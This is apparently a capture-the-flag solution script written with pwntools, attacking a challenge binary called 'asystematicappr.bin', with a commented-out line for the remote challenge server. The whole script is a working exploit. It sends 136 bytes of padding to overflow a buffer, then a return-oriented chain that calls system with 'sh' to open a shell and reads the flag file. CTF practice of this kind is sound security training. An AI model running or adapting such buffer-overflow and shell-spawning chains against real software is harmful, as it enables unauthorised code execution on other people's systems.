from pwn import *
p = process("./asystematicappr.bin")
#p = remote("fitsec-a-systematic-approach.chals.io", 443, ssl=True, sni="fitsec-a-systematic-approach.chals.io")
e = context.binary = ELF("asystematicappr.bin")
p.recvuntil(">>>")
chain = b'A' * 136
chain += p64(0x004011a9) # pop rdi ret
chain += p64(0x00402054) # string sh
chain += p64(0x0040101a) # ret for alignment
chain += p64(e.sym['system'])
p.sendline(chain)
pause()
p.sendline("cat flag.txt")
p.interactive()
